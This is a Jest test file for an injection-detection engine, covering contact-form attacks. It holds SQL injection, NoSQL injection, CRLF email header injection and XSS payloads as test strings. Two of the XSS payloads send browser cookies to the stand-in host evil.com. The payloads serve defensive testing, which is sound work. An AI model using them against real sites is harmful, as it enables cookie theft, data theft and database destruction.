'use strict';
const { DetectionEngine } = require('../../src/index');

describe('Scenario: Contact Form Attacks', () => {
  let engine;
  beforeEach(() => {
    engine = new DetectionEngine();
  });

  const runPayload = (payload) => engine.detect(payload);

  it('detects SQLi in name field', () => {
    const result = runPayload("admin' OR '1'='1");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects stacked query via name', () => {
    const result = runPayload("Robert'); DROP TABLE contacts;--");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects SQLi in email field', () => {
    const result = runPayload("attacker@evil.com' UNION SELECT password FROM users--");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects email header injection (CRLF)', () => {
    const result = runPayload("test@test.com\r\nBcc: victim@target.com");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects encoded email header injection', () => {
    const result = runPayload("test@test.com%0ACc:spam@evil.com");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects stored XSS in subject', () => {
    const result = runPayload("<script>document.location='http://evil.com/steal?c='+document.cookie</script>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects XSS via img error handler', () => {
    const result = runPayload("<img src=x onerror=fetch('http://evil.com/'+document.cookie)>");
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects XSS via iframe javascript URI', () => {
    const result = runPayload('<iframe src="javascript:alert(1)"></iframe>');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects NoSQL injection in message body', () => {
    const result = runPayload('{"$gt":""}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('detects NoSQL $where injection', () => {
    const result = runPayload('{"$where":"this.password.match(/^a/)"}');
    expect(result.confidence).toBeGreaterThan(0.3);
  });

  it('allows benign name', () => {
    const result = runPayload("John Doe");
    expect(result.label).toBe('benign');
  });

  it('allows benign email', () => {
    const result = runPayload("john.doe@company.co.uk");
    expect(result.label).toBe('benign');
  });

  it('allows benign subject', () => {
    const result = runPayload("Question about your services");
    expect(result.label).toBe('benign');
  });

  it('allows benign message', () => {
    const result = runPayload("Hi, I'd like to learn more about your pricing plans. Thanks!");
    expect(result.label).toBe('benign');
  });

  it('allows benign message with apostrophe', () => {
    const result = runPayload("I'm interested in the product. Can you send me details?");
    expect(result.label).toBe('benign');
  });
});
